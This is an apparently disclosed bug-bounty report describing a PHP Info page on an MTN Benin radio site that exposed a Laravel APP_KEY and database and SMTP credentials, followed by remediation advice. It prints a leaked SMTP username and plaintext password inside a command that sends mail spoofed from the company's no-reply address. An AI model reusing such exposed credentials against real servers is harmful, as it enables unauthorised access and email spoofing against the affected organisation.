# PHP Info Exposing Secrets at https://radio.mtn.bj/info

## Report Details
- **Report ID**: 1049402
- **URL**: https://hackerone.com/reports/1049402
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-12-03T05:23:56.753Z
- **Disclosed**: 2022-03-08T10:48:49.462Z

## Reporter
- **Username**: pudsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
## Summary:
During recon I discovered a PHP Info file exposing environment variables such as; Laravel APP_KEY, Database username/password, SMTP username/password, etc.

## Steps To Reproduce:
Visit the following URL;
```
https://radio.mtn.bj/info
```
You will be presented with a PHP Info file exposing environment / PHP Variables.

## Further Information:
I successfully sent an email using [python-smtp-mail-sending-tester](https://github.com/turbodog/python-smtp-mail-sending-tester) with the exposed credentials;
```
$ python smtptest.py -v -u eba@gbdesignweb.com -p w?#h#DLkAPa7 no-reply@mtn.bj pudsec@wearehackerone.com camembert.o2switch.net
('usetls:', False)
('usessl:', False)
('from address:', 'no-reply@mtn.bj')
('to address:', 'pudsec@wearehackerone.com')
('server address:', 'camembert.o2switch.net')
('server port:', 25)
('smtp username:', 'eba@gbdesignweb.com')
smtp password: *****
('smtplib debuglevel:', 0)
-- Message body ---------------------
From: no-reply@mtn.bj
To: pudsec@wearehackerone.com
Subject: Test Message from smtptest at 2020-12-03 13:02:56

Test message from the smtptest tool sent at 2020-12-03 13:02:56
-------------------------------------
```

The [APP_KEY](https://divinglaravel.com/app_key-is-a-secret-heres-what-its-used-for-how-you-can-rotate-it) being exposed can potential be abused as it's primary purpose is for encrypting cookies, creating signatures and encrypting/decrypting values.

## Suggestions:
* Never expose PHP Info
* Change all passwords and APP_KEY

## Impact

Exposing passwords to critical services.
Providing application keys used for encryption/decryption within the app.
Sending email coming from an official email address.

## Attachments
No attachments
